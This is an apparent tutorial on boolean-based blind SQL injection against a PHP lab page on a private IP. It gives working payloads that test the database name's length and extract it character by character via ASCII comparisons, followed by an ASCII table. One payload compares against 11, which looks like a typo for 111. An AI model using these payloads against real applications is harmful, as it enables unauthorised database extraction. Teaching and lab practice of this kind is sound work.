
### Boolean-based Blind SQL Injection

**Blind SQL Injection** occurs when a web application is vulnerable to SQL injection, but the results of the injection are not directly visible in the application's response. Instead, the attacker must infer information based on indirect indicators.

In Boolean-based Blind SQL Injection, the attacker sends SQL queries to the server and determines the result based on whether the application behaves differently (e.g., shows different content or responds differently) based on the condition in the SQL query. This technique is called "Boolean-based" because the attacker relies on true/false (boolean) responses to extract information.

#### Key Concepts

- **No Visible Errors or Output:** In blind SQL injection, neither output nor errors are directly visible. Instead, the application responds differently based on the SQL query's validity.
- **Display Errors Setting:** Ensure that `display_errors` in PHP configuration is set to `Off` to prevent error messages from being shown, which might otherwise give clues about the SQL query.

  ```bash
  # Edit PHP configuration
  vim /etc/php/8.2/apache2/php.ini
  # Set display_errors to Off
  display_errors = Off
  ```

#### Example URLs

- `192.168.43.2/blind-injection-boolean-type.php`
- `192.168.43.2/blind-injection-boolean-type-post.php`

#### Basic Techniques

1. **Basic Boolean Test**
   ```sql
   1' AND 1=1 --+
   ```
   This condition is always true. If the application behaves normally, the injection point is vulnerable.

2. **Database Name Length Check**
   ```sql
   1' AND (SELECT LENGTH(DATABASE())) --+
   
   1' AND (SELECT LENGTH(DATABASE()) = 9) --+
   
   1' AND (SELECT LENGTH(DATABASE()) > 10) --+
   
   1' AND (SELECT LENGTH(DATABASE()) < 8) --+
   ```
   These queries test the length of the database name. By adjusting the length value, you can determine the exact length of the database name.

3. **Character-by-Character Extraction**
   ```sql
   1' AND (SELECT ASCII(SUBSTR(DATABASE(),1,1)) = 97) --+
   
   1' AND (SELECT ASCII(SUBSTR(DATABASE(),2,1)) = 114) --+
   
   1' AND (SELECT ASCII(SUBSTR(DATABASE(),3,1)) = 109) --+
   
   1' AND (SELECT ASCII(SUBSTR(DATABASE(),4,1)) = 11) --+
   
   1' AND (SELECT ASCII(SUBSTR(DATABASE(),5,1)) = 117) --+
   
   1' AND (SELECT ASCII(SUBSTR(DATABASE(),6,1)) = 114) --+
   
   1' AND (SELECT ASCII(SUBSTR(DATABASE(),7,1)) = 95) --+
   
   1' AND (SELECT ASCII(SUBSTR(DATABASE(),8,1)) = 100) --+
   
   1' AND (SELECT ASCII(SUBSTR(DATABASE(),9,1)) = 98) --+
   ```
   These queries check each character of the database name by comparing the ASCII value. Continue this process for each character position until the complete database name is identified.

#### ASCII Table Reference

| Dec | Char | Dec | Char | Dec | Char | Dec | Char |
|-----|------|-----|------|-----|------|-----|------|
| 0   | NUL  | 32  | SPACE| 64  | @    | 96  | `    |
| 1   | SOH  | 33  | !    | 65  | A    | 97  | a    |
| 2   | STX  | 34  | "    | 66  | B    | 98  | b    |
| 3   | ETX  | 35  | #    | 67  | C    | 99  | c    |
| 4   | EOT  | 36  | $    | 68  | D    | 100 | d    |
| 5   | ENQ  | 37  | %    | 69  | E    | 101 | e    |
| 6   | ACK  | 38  | &    | 70  | F    | 102 | f    |
| 7   | BEL  | 39  | '    | 71  | G    | 103 | g    |
| 8   | BS   | 40  | (    | 72  | H    | 104 | h    |
| 9   | TAB  | 41  | )    | 73  | I    | 105 | i    |
| 10  | LF   | 42  | *    | 74  | J    | 106 | j    |
| 11  | VT   | 43  | +    | 75  | K    | 107 | k    |
| 12  | FF   | 44  | ,    | 76  | L    | 108 | l    |
| 13  | CR   | 45  | -    | 77  | M    | 109 | m    |
| 14  | SO   | 46  | .    | 78  | N    | 110 | n    |
| 15  | SI   | 47  | /    | 79  | O    | 111 | o    |
| 16  | DLE  | 48  | 0    | 80  | P    | 112 | p    |
| 17  | DC1  | 49  | 1    | 81  | Q    | 113 | q    |
| 18  | DC2  | 50  | 2    | 82  | R    | 114 | r    |
| 19  | DC3  | 51  | 3    | 83  | S    | 115 | s    |
| 20  | DC4  | 52  | 4    | 84  | T    | 116 | t    |
| 21  | NAK  | 53  | 5    | 85  | U    | 117 | u    |
| 22  | SYN  | 54  | 6    | 86  | V    | 118 | v    |
| 23  | ETB  | 55  | 7    | 87  | W    | 119 | w    |
| 24  | CAN  | 56  | 8    | 88  | X    | 120 | x    |
| 25  | EM   | 57  | 9    | 89  | Y    | 121 | y    |
| 26  | SUB  | 58  | :    | 90  | Z    | 122 | z    |
| 27  | ESC  | 59  | ;    | 91  | [    | 123 | {    |
| 28  | FS   | 60  | <    | 92  | \    | 124 | |    |
| 29  | GS   | 61  | =    | 93  | ]    | 125 | }    |
| 30  | RS   | 62  | >    | 94  | ^    | 126 | ~    |
| 31  | US   | 63  | ?    | 95  | _    | 127 | DEL  |

